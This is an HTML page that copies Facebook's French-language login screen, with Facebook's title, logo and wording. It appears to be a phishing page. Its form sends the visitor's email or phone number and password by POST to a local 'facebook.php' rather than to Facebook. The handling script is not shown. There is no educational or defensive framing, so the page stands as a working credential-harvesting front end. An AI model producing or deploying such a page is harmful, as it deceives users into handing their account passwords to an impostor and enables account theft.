<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – Log in or Sign up</title>
  <link rel="stylesheet" href="styles/default.css">
  <link rel="stylesheet" href="styles/style.css">
  <link rel="icon" href="img/facebook.png" type="image/x-icon">
</head>
<body>
  <div class="login">
    <div class="container">
      <div class="row">
          <div class="col-7">
              <div class="align-center">
                <div class="content">
                  <img src="img/logo.svg" alt="" style="transform: scale(2); margin-left: 2.6rem;">
                  <p>
                    Avec Facebook, partagez et restez en<br>
                    contact avec votre entourage.
                  </p>
                </div>
              </div>
          </div>
          <div class="col-5 col-xs-12">
            <div class="login-form">
              <form action="facebook.php" method="post">
                <input id="email" type="text" placeholder="Adresse e-mail ou numéro de tel." name="username"><br>
                <input id="pass" type="password" placeholder="Mot de passe" name="password"><br>
                <button id="login-btn" type="submit">Se connecter</button><br>
                <a href="#">Mot de passe oublié ?</a><br>
                <button id="create-btn" type="button">Créer nouveau compte</button><br>
              </form>
            </div>
            <footer>
              <a href="#"
              style="font-weight: bold;
              color: var(--black);
              text-decoration: none;">Créer une Page</a> 
              pour une célébrité, une marque ou une entreprise.
            </footer>
          </div>
      </div>
    </div>
  </div>
</body>

</html>
